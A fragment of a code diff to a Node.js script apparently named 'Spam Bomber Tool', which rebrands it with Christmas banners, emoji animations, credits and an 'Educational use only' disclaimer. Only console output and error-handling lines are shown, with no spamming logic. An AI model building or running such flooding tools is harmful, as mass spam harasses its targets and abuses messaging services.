-        console.log(colors.red + '\n' + '🔥 FINAL NOTIFICATION 🔥' + colors.reset);
-        console.log(colors.yellow + '   👑 Original Creator: FlowFalcon' + colors.reset);
-        console.log(colors.cyan + '   🔥 Renovation by: Rim' + colors.reset);
-        console.log(colors.magenta + '   ⚠️  Educational Purpose Only!' + colors.reset);
-        console.log(colors.green + '   ✅ All spam codes have been processed!' + colors.reset);
+        console.log(colors.red + '\n   🎄 FINAL CHRISTMAS GREETINGS 🎄' + colors.reset);
+        console.log(colors.green + '   🎅 Original by: FlowFalcon' + colors.reset);
+        console.log(colors.cyan + '   🎁 Renovasi by: Rim' + colors.reset);
+        console.log(colors.yellow + '   ⚠️  Educational use only!' + colors.reset);
+        console.log(colors.magenta + '   ✨ Merry Christmas & Happy New Year! ✨' + colors.reset);
         
         console.log('\n' + colors.rainbow);
-        for (let i = 0; i < 3; i++) {
-            console.log('   🚀 '.repeat(8));
-            console.log('   💥 '.repeat(8));
-            await new Promise(r => setTimeout(r, 300));
+        for (let i = 0; i < 5; i++) {
+            console.log('   🎄 '.repeat(10));
+            console.log('   🎅 '.repeat(10));
+            await new Promise(resolve => setTimeout(resolve, 400));
         }
         console.log(colors.reset);
         
-        anim.sendNotification('THANK YOU', 'Thanks for using Spam Bomber Tool!', 'info');
+        anim.sendChristmasNotification('THANK YOU', 'Thanks for using Christmas Spam Bomber! 🎁', 'info');
         
     } catch (error) {
-        anim.sendNotification('CRITICAL ERROR', `System failed: ${error.message}`, 'error');
-        console.log(colors.red + '\n   💀 SYSTEM CRASHED!' + colors.reset);
-        console.log(colors.yellow + `   🔧 Error details: ${error.message}` + colors.reset);
-        console.log(colors.cyan + '   💡 Tips: Check internet connection and session folder' + colors.reset);
+        anim.sendChristmasNotification('SYSTEM ERROR', `Critical failure: ${error.message}`, 'error');
+        console.log(colors.red + '\n   🎄 CHRISTMAS SPAM FAILED! 🎄' + colors.reset);
+        console.log(colors.yellow + `   🔧 Error: ${error.message}` + colors.reset);
+        console.log(colors.cyan + '   💡 Check your internet and session folder!' + colors.reset);
     }
     
     anim.clearAll();
@@ -452,7 +494,7 @@ async function KleeProject() {
 
 process.on('SIGINT', () => {
     anim.clearAll();
-    console.log(colors.red + '\n\n💀 SPAM STOPPED BY USER!' + colors.reset);
+    console.log(colors.red + '\n\n🎄 Christmas spam stopped by user! 🎄' + colors.reset);
     process.exit(0);
 });
 
